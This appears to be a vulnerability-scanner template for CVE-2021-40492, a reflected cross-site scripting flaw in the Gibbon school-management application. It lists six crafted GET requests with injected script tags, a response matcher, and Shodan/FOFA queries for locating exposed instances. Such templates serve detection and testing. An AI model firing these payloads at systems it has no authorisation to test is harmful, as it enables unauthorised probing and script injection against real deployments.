id: CVE-2021-40492

info:
  name: Gibbon Reflected XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A reflected XSS vulnerability exists in multiple pages in version 22 of the Gibbon application that allows for arbitrary execution of JavaScript.
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of the victim's browser.
  remediation: |
    Implement proper input validation and output encoding to prevent XSS attacks.
  reference:
    - https://github.com/5qu1n7/CVE-2021-40492
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/n0-traces/cve_monitor
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-40492
    cwe-id: CWE-79
    epss-score: 0.00096
    epss-percentile: 0.41666
    cpe: cpe:2.3:a:gibbonedu:gibbon:22.0.00:*:*:*:*:*:*:*
  metadata:
    vendor: gibbonedu
    product: gibbon
    shodan-query: http.favicon.hash:-165631681
    fofa-query: icon_hash="-165631681"

http:
  - method: GET
    path:
      - "{{BaseURL}}/gibbonedu/index.php?q=%2Fmodules%2FFormal+Assessment%2FexternalAssessment_details.php&gibbonPersonID=0000001819d7gdw'%3e%3cscript%3ealert(1)%3c%2fscript%3eckbcl&search=&allStudents="
      - "{{BaseURL}}/gibbonedu/index.php?q=%2fmodules%2fDepartments%2fdepartment_course_class.php&gibbonCourseClassID=00002425sbh6q%22%3e%3cscript%3ealert(XSS)%3c%2fscript%3ezdb7w"
      - "{{BaseURL}}/gibbonedu/index.php?q=%2Fmodules%2FFormal+Assessment%2FexternalAssessment_details.php&gibbonPersonID=0000001819&search=k7zkk'%3e%3cscript%3ealert(XSS)%3c%2fscript%3eiqdj2&allStudents="
      - "{{BaseURL}}/gibbonedu/index.php?q=%2fmodules%2fPlanner%2fplanner.php&gibbonCourseClassID=00002425%7d%7dih0ol'%3e%3cscript%3ealert(XSS)%3c%2fscript%3eadssq&viewBy=class"
      - "{{BaseURL}}/gibbonedu/index.php?q=%2fmodules%2fStudents%2fstudent_view_details.php&gibbonPersonID=2033&search=&allStudents=on&sort=surname%2c%20preferredName&subpage=Familyjxlcj%3cscript%3ealert(XSS)%3c%2fscript%3emn58l"
      - "{{BaseURL}}/gibbonedu/index.php?q=%2fmodules%2fDepartments%2fdepartment_course_class.php&gibbonCourseClassID=00002425&currentDate=k9q4m%22%3e%3cscript%3ealert(XSS)%3c%2fscript%3etfuh1"

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
          - "<script>alert(XSS)</script>"
        part: body
